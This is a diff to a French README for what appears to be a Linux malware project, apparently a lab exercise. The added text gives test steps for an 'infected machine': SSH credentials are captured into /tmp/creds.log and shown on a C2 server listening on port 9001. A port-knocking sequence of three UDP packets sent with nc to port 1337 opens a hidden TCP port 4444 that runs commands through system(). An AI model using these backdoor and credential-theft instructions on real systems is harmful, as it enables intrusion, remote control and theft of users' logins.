@@ -64,12 +64,18 @@ Sur une autre machine ou dans un terminal séparé, lancez le serveur C2 pour re
 ./c2_server
 ```
 
-Le serveur écoute sur le port 9001 et affiche les messages reçus (par exemple, l'enregistrement d'une machine infectée et les credentials interceptés).
+Le serveur écoute sur le port 9001 et affiche les messages reçus.
+
+Test de l'extraction des Credentials
+   Connectez-vous en SSH sur la machine infectée (exemple : ssh utilisateur@<IP>) et vérifiez que :
+
+    Le fichier /tmp/creds.log contient les credentials capturés.
+    Le serveur C2 affiche bien ces informations.
 
 
 3. Test du Port Knocking
 
-Pour tester le mécanisme de port knocking, envoyez successivement trois paquets UDP contenant les chaînes suivantes sur le port 1337 de la machine infectée. Vous pouvez utiliser netcat (nc) :
+Envoyez successivement trois paquets UDP sur le port 1337 de la machine infectée avec :
 
 ```bash
 echo "knock1" | nc -u <IP_de_la_machine_infectée> 1337
@@ -78,6 +84,15 @@ echo "knock3" | nc -u <IP_de_la_machine_infectée> 1337
 ```
 
 Une fois la séquence validée, un socket TCP s'ouvrira sur le port 4444 pour recevoir une commande, laquelle sera exécutée via system().
+
+Envoi d'une commande via le Port Knocking
+Connectez-vous au port TCP avec :
+
+```bash
+nc <IP_de_la_machine_infectée> 4444
+```
+
+Tapez une commande (par exemple, id ou ls) et appuyez sur Entrée pour l'exécuter via system().
 
 ## Documentation Théorique
 
